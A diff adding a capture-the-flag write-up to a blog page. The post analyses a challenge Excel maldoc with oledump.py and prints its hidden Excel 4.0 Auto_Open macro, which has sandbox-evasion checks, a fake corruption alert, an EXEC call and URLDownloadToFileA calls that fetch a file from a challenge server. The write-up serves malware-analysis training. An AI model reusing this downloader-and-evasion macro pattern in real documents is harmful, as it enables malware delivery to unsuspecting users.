@@ -38,11 +38,31 @@
     <meta property="article:tag" content="2020" />
     
     <meta property="article:tag" content="reality" />
+    
+    <meta property="article:tag" content="maldoc" />
+    
+    <meta property="article:tag" content="ole" />
+    
+    <meta property="article:tag" content="object linking and embedding" />
+    
+    <meta property="article:tag" content="oledump" />
+    
+    <meta property="article:tag" content="oledump.py" />
+    
+    <meta property="article:tag" content="excel" />
+    
+    <meta property="article:tag" content="xls" />
+    
+    <meta property="article:tag" content="hidden column" />
+    
+    <meta property="article:tag" content="excel formula" />
+    
+    <meta property="article:tag" content="excel functions" />
         
 
     <meta name="twitter:card" content="summary"/>
     <meta name="twitter:title" content="Reality Challenge">
-    <meta name="twitter:description" content="">
+    <meta name="twitter:description" content="You must obtain the hidden secrets in order to see the reality.">
     <meta name="twitter:site" content="@jebidiah-anthony" />
     <meta name="twitter:creator" content="@feeeellliix">
 
@@ -59,11 +79,13 @@
 <meta name="generator" content="Jekyll v4.0.0" />
 <meta property="og:title" content="Reality Challenge" />
 <meta property="og:locale" content="en_US" />
+<meta name="description" content="You must obtain the hidden secrets in order to see the reality." />
+<meta property="og:description" content="You must obtain the hidden secrets in order to see the reality." />
 <link rel="canonical" href="https://jebidiah-anthony.github.io/chals/ctf/2020_ROOTCONEasterEggHunt/Reality.html" />
 <meta property="og:url" content="https://jebidiah-anthony.github.io/chals/ctf/2020_ROOTCONEasterEggHunt/Reality.html" />
 <meta property="og:site_name" content="jebidiah-anthony" />
 <script type="application/ld+json">
-{"headline":"Reality Challenge","@type":"WebPage","url":"https://jebidiah-anthony.github.io/chals/ctf/2020_ROOTCONEasterEggHunt/Reality.html","@context":"https://schema.org"}</script>
+{"headline":"Reality Challenge","@type":"WebPage","url":"https://jebidiah-anthony.github.io/chals/ctf/2020_ROOTCONEasterEggHunt/Reality.html","description":"You must obtain the hidden secrets in order to see the reality.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -390,7 +412,291 @@
          <section id="main_content"><div class="paragraph">
 <p><span><h1 style="color:red">Reality Challenge</h1></span></p>
 </div>
-<hr></section>
+<hr>
+<div class="sect1">
+<h2 id="part-1-given-files">PART 1 : GIVEN FILES</h2>
+<div class="sectionbody">
+<div class="ulist">
+<ul>
+<li>
+<p><a href="/chals/ctf/2020_ROOTCONEasterEggHunt/files/reality.tar.gz">power.tar.gz</a></p>
+</li>
+</ul>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">md5sum </span>reality.tar.gz
+
+  4f494a43e54d1ba0936e58a299f25fc0  reality.tar.gz
+
+<span class="nv">$ </span><span class="nb">sha1sum </span>reality.tar.gz
+
+  f74ea01066dc1b1bd25a900def3d7bd1b410f9be  reality.tar.gz
+
+<span class="nv">$ </span><span class="nb">gzip</span> <span class="nt">-d</span> reality.tar.gz
+
+<span class="nv">$ </span><span class="nb">tar </span>xvf reality.tar.gz
+
+  reality/
+  reality/readme.txt
+  reality/topsecret.xls</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-2-challenge-description">PART 2 : CHALLENGE DESCRIPTION</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>The file, <span style="color:orange"><code>readme.txt</code></span>, reads the following:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre>Challenge Description:
+
+        You must obtain the hidden secrets in order to see the reality.</pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-3-the-maldoc">PART 3 : THE MALDOC</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Opening <span style="color:orange"><code>topsecret.xls</code></span> reveals nothing much:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="imageblock">
+<div class="content">
+<img src="./screenshots/reality_topsecret.png" alt="topsecret.xls">
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Microsoft Excel is capable of using <span style="color:orange">OLE (Object Linking and Embedding)</span> which allows you to take objects in a document and place it in other applications or perhaps even itself.</p>
+</div>
+<div class="paragraph">
+<p>I decided to check if the excel file is using <strong><code>Object Linking and Embedding</code></strong> using <a href="https://blog.didierstevens.com/programs/oledump-py/" target="_blank" rel="noopener">oledump.py</a>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python oledump.py <span class="nt">-p</span> plugin_biff <span class="nt">--pluginoptions</span> <span class="s2">"-x"</span> <span class="s2">"../topsecret.xls"</span>
+
+  <span class="nt">---omitted---</span>
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 <span class="nv">len</span><span class="o">=</span>576 ptgRefV R500C49154 ptgRefV R501C49154 ptgConcat <span class="nt">---omitted---</span> ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R51C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500C49156 ptgRefV R501C49156 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R52C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500C49158 ptgRefV R501C49158 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R53C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500C49160 ptgRefV R501C49160 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R54C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500C49162 ptgRefV R501C49162 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    414 FORMULA : Cell Formula - R55C18 <span class="nv">len</span><span class="o">=</span>392 ptgRefV R500C49164 ptgRefV R501C49164 ptgConcat <span class="nt">---omitted---</span> ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    888 FORMULA : Cell Formula - R56C18 <span class="nv">len</span><span class="o">=</span>866 ptgRefV R500C49167 ptgRefV R501C49167 ptgConcat <span class="nt">---omitted---</span> ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    108 FORMULA : Cell Formula - R57C18 <span class="nv">len</span><span class="o">=</span>86 ptgRefV R500C49169 ptgRefV R501C49169 ptgConcat <span class="nt">---omitted---</span> ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R58C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"calc.exe"</span> ptgFuncVarV args 1 func EXEC <span class="o">(</span>0x006e<span class="o">)</span>
+  <span class="c"><mark>0006     37 FORMULA : Cell Formula - R59C18 len=15 ptgStr "Sheet2" ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE (0x817f)</mark></span>
+  <span class="nt">---omitted---</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There is a sheet hidden using <strong><code>WORKBOOK.HIDE</code></strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="imageblock">
+<div class="content">
+<img src="./screenshots/reality_sheet2.png" alt="Sheet2">
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Which has the following Excel functions written vertically with each character placed beside to the right of its ASCII decimal value:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">=</span>ALERT<span class="o">(</span><span class="s2">"The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt."</span>,2<span class="o">)</span>
+<span class="o">=</span>IF<span class="o">(</span>GET.WORKSPACE<span class="o">(</span>13<span class="o">)</span>&lt;770, CLOSE<span class="o">(</span>FALSE<span class="o">)</span>,<span class="o">)</span>
+<span class="o">=</span>IF<span class="o">(</span>GET.WORKSPACE<span class="o">(</span>14<span class="o">)</span>&lt;381, CLOSE<span class="o">(</span>FALSE<span class="o">)</span>,<span class="o">)</span>
+<span class="o">=</span>IF<span class="o">(</span>GET.WORKSPACE<span class="o">(</span>19<span class="o">)</span>,,CLOSE<span class="o">(</span>FALSE<span class="o">))</span>
+<span class="o">=</span>IF<span class="o">(</span>GET.WORKSPACE<span class="o">(</span>42<span class="o">)</span>,,CLOSE<span class="o">(</span>FALSE<span class="o">))</span>
+<span class="o">=</span>IF<span class="o">(</span>ISNUMBER<span class="o">(</span>SEARCH<span class="o">(</span><span class="s2">"Windows"</span>,GET.WORKSPACE<span class="o">(</span>1<span class="o">)))</span>, ,CLOSE<span class="o">(</span>FALSE<span class="o">))</span>
+<span class="c"><mark>=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://easteregg.rootcon.net/AZfzv7ckfbxj2Q6X/GC3Z543PZQL2buV ","c:\Users\Public\flag.txt",0,0)</mark></span>
+<span class="o">=</span>CLOSE<span class="o">(</span>FALSE<span class="o">)</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-4-getting-the-flag">PART 4 : GETTING THE FLAG</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>The highlighted function from earlier seems to download a file and then is saved to <span style="color:orange">c:\Users\Public\flag.txt</span> and attempting to download the same file gives you:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="paragraph">
+<p><span class="image"><img src="./screenshots/GC3Z543PZQL2buV6.jpg" alt="fake flag"></span></p>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The flag is somewhere else&#8230;&#8203;</p>
+</div>
+<div class="paragraph">
+<p>Going back to the OLE dump:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python oledump.py <span class="nt">-p</span> plugin_biff <span class="nt">--pluginoptions</span> <span class="s2">"-x"</span> <span class="s2">"../topsecret.xls"</span>
+
+  <span class="nt">---omitted---</span>
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 <span class="c"><mark>FORMULA</mark> : Cell Formula - R50C18 len=576 ptgRefV <mark>R500C49154</mark> ptgRefV <mark>R501C49154</mark> ptgConcat ---omitted--- ptgRefV <mark>R593C49154</mark> ptgConcat ptgAttr ptgRef <mark>R50C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    276 <span class="c"><mark>FORMULA</mark> : Cell Formula - R51C18 len=254 ptgRefV <mark>R500C49156</mark> ptgRefV <mark>R501C49156</mark> ptgConcat ---omitted--- ptgRefV <mark>R540C49156</mark> ptgConcat ptgRef <mark>R51C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    276 <span class="c"><mark>FORMULA</mark> : Cell Formula - R52C18 len=254 ptgRefV <mark>R500C49158</mark> ptgRefV <mark>R501C49158</mark> ptgConcat ---omitted--- ptgRefV <mark>R540C49158</mark> ptgConcat ptgRef <mark>R52C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    246 <span class="c"><mark>FORMULA</mark> : Cell Formula - R53C18 len=224 ptgRefV <mark>R500C49160</mark> ptgRefV <mark>R501C49160</mark> ptgConcat ---omitted--- ptgRefV <mark>R535C49160</mark> ptgConcat ptgRef <mark>R53C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    246 <span class="c"><mark>FORMULA</mark> : Cell Formula - R54C18 len=224 ptgRefV <mark>R500C49162</mark> ptgRefV <mark>R501C49162</mark> ptgConcat ---omitted--- ptgRefV <mark>R535C49162</mark> ptgConcat ptgRef <mark>R54C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    414 <span class="c"><mark>FORMULA</mark> : Cell Formula - R55C18 len=392 ptgRefV <mark>R500C49164</mark> ptgRefV <mark>R501C49164</mark> ptgConcat ---omitted--- ptgRefV <mark>R563C49164</mark> ptgConcat ptgRef <mark>R55C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    888 <span class="c"><mark>FORMULA</mark> : Cell Formula - R56C18 len=866 ptgRefV <mark>R500C49167</mark> ptgRefV <mark>R501C49167</mark> ptgConcat ---omitted--- ptgRefV <mark>R642C49167</mark> ptgConcat ptgRef <mark>R56C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006    108 <span class="c"><mark>FORMULA</mark> : Cell Formula - R57C18 len=86 ptgRefV <mark>R500C49169</mark> ptgRefV <mark>R501C49169</mark> ptgConcat ---omitted--- ptgRefV <mark>R512C49169</mark> ptgConcat ptgRef <mark>R57C49171</mark> ptgFuncVarV args 2 func FORMULA (0x8060)</span>
+  0006     37 FORMULA : Cell Formula - R58C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"calc.exe"</span> ptgFuncVarV args 1 func EXEC <span class="o">(</span>0x006e<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R59C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"Sheet2"</span> ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE <span class="o">(</span>0x817f<span class="o">)</span>
+  <span class="nt">---omitted---</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It seems that the eight formulas written vertically from earlier are being referenced in <span style="color:orange">ROWS 50-57</span> in <span style="color:orange">COL 49171</span> and the characters starting from <span style="color:orange">ROW 500</span> downward are being concatenated using <span style="color:orange">ptgConcat</span> to build the entire function/formula.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python oledump.py <span class="nt">-p</span> plugin_biff <span class="nt">--pluginoptions</span> <span class="s2">"-x"</span> <span class="s2">"../topsecret.xls"</span>
+
+  <span class="nt">---omitted---</span>
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 <span class="nv">len</span><span class="o">=</span>576 ptgRefV R500<mark>C49154</mark> ptgRefV R501C49154 ptgConcat <span class="nt">---omitted---</span> ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R51C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500<mark>C49156</mark> ptgRefV R501C49156 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R52C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500<mark>C49158</mark> ptgRefV R501C49158 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R53C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500<mark>C49160</mark> ptgRefV R501C49160 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R54C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500<mark>C49162</mark> ptgRefV R501C49162 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    414 FORMULA : Cell Formula - R55C18 <span class="nv">len</span><span class="o">=</span>392 ptgRefV R500<mark>C49164</mark> ptgRefV R501C49164 ptgConcat <span class="nt">---omitted---</span> ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    888 FORMULA : Cell Formula - R56C18 <span class="nv">len</span><span class="o">=</span>866 ptgRefV R500<mark>C49167</mark> ptgRefV R501C49167 ptgConcat <span class="nt">---omitted---</span> ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    108 FORMULA : Cell Formula - R57C18 <span class="nv">len</span><span class="o">=</span>86 ptgRefV R500<mark>C49169</mark> ptgRefV R501C49169 ptgConcat <span class="nt">---omitted---</span> ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R58C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"calc.exe"</span> ptgFuncVarV args 1 func EXEC <span class="o">(</span>0x006e<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R59C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"Sheet2"</span> ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE <span class="o">(</span>0x817f<span class="o">)</span>
+  <span class="nt">---omitted---</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now, if you consider <span style="color:orange">COL 49154</span> to be <span style="color:orange">column B in Sheet 2</span>, then <span style="color:orange">COL 49156</span> should be <span style="color:orange">column D</span>, <span style="color:orange">COL 49158</span> should be <span style="color:orange">column F</span>, and so on&#8230;&#8203;</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>python oledump.py <span class="nt">-p</span> plugin_biff <span class="nt">--pluginoptions</span> <span class="s2">"-x"</span> <span class="s2">"../topsecret.xls"</span>
+
+  <span class="nt">---omitted---</span>
+  0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible
+  0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden
+  0018     23 LABEL : Cell Value, String Constant - build-in-name 1 Auto_Open
+  0006    598 FORMULA : Cell Formula - R50C18 <span class="nv">len</span><span class="o">=</span>576 ptgRefV R500C49154 ptgRefV R501C49154 ptgConcat <span class="nt">---omitted---</span> ptgRefV R593C49154 ptgConcat ptgAttr ptgRef R50C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R51C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500C49156 ptgRefV R501C49156 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49156 ptgConcat ptgRef R51C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    276 FORMULA : Cell Formula - R52C18 <span class="nv">len</span><span class="o">=</span>254 ptgRefV R500C49158 ptgRefV R501C49158 ptgConcat <span class="nt">---omitted---</span> ptgRefV R540C49158 ptgConcat ptgRef R52C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R53C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500C49160 ptgRefV R501C49160 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49160 ptgConcat ptgRef R53C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    246 FORMULA : Cell Formula - R54C18 <span class="nv">len</span><span class="o">=</span>224 ptgRefV R500C49162 ptgRefV R501C49162 ptgConcat <span class="nt">---omitted---</span> ptgRefV R535C49162 ptgConcat ptgRef R54C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    414 FORMULA : Cell Formula - R55C18 <span class="nv">len</span><span class="o">=</span>392 ptgRefV R500<mark>C49164</mark> ptgRefV R501C49164 ptgConcat <span class="nt">---omitted---</span> ptgRefV R563C49164 ptgConcat ptgRef R55C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    888 FORMULA : Cell Formula - R56C18 <span class="nv">len</span><span class="o">=</span>866 ptgRefV R500<mark>C49167</mark> ptgRefV R501C49167 ptgConcat <span class="nt">---omitted---</span> ptgRefV R642C49167 ptgConcat ptgRef R56C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006    108 FORMULA : Cell Formula - R57C18 <span class="nv">len</span><span class="o">=</span>86 ptgRefV R500C49169 ptgRefV R501C49169 ptgConcat <span class="nt">---omitted---</span> ptgRefV R512C49169 ptgConcat ptgRef R57C49171 ptgFuncVarV args 2 func FORMULA <span class="o">(</span>0x8060<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R58C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"calc.exe"</span> ptgFuncVarV args 1 func EXEC <span class="o">(</span>0x006e<span class="o">)</span>
+  0006     37 FORMULA : Cell Formula - R59C18 <span class="nv">len</span><span class="o">=</span>15 ptgStr <span class="s2">"Sheet2"</span> ptgBool TRUE ptgFuncVarV args 2 func WORKBOOK.HIDE <span class="o">(</span>0x817f<span class="o">)</span>
+  <span class="nt">---omitted---</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The expected columns where the function/formulas are built should be <span style="color:orange">B &#8594; D &#8594; F &#8594; H &#8594; J &#8594; L &#8594; N &#8594; P</span> but as you can see from the dump, <span style="color:orange">COL 49164</span> jumps to <span style="color:orange">COL 49167</span> meaning <span style="color:orange">column L</span> jumped to <span style="color:orange">column O</span> which shouldn&#8217;t be the case.</p>
+</div>
+<div class="paragraph">
+<p>If you look at the Excel Sheet, it would reveal that <span style="color:orange">column N</span> is missing and when revealed:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="imageblock">
+<div class="content">
+<img src="./screenshots/reality_column_N.png" alt="column N">
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>It shows a new set of numbers which when converted to ASCII:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="o">=</span>CALL<span class="o">(</span><span class="s2">"urlmon"</span>,<span class="s2">"URLDownloaToFileA"</span>,<span class="s2">"JJCCJJ"</span>,0,<span class="s2">"<mark>http://easteregg.rootcon.net/sFpWgx9WkHQQ542K/36xQCWUDNaJpbTB</mark>"</span>,<span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\P</span><span class="s2">ublic</span><span class="se">\f</span><span class="s2">lag.txt"</span>,0,0<span class="o">)</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>A new download link is found which is also saved to <span style="color:orange">c:\Users\Public\flag.txt</span>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat </span>36xQCWUDNaJpbTB
+
+  rc_easter<span class="o">{</span>r34l1ty_15_0ft3n__d1s4pp01nt1ng<span class="o">}</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The real flag is revealed after downloading the file!!</p>
+</div>
+<hr>
+<div style="width:100%;overflow-x:auto"><h2>FLAG : <strong>rc_easter{r34l1ty_15_0ft3n__d1s4pp01nt1ng}</strong></h2></div>
+</div>
+</div></section>
        </div>
     </div>
 
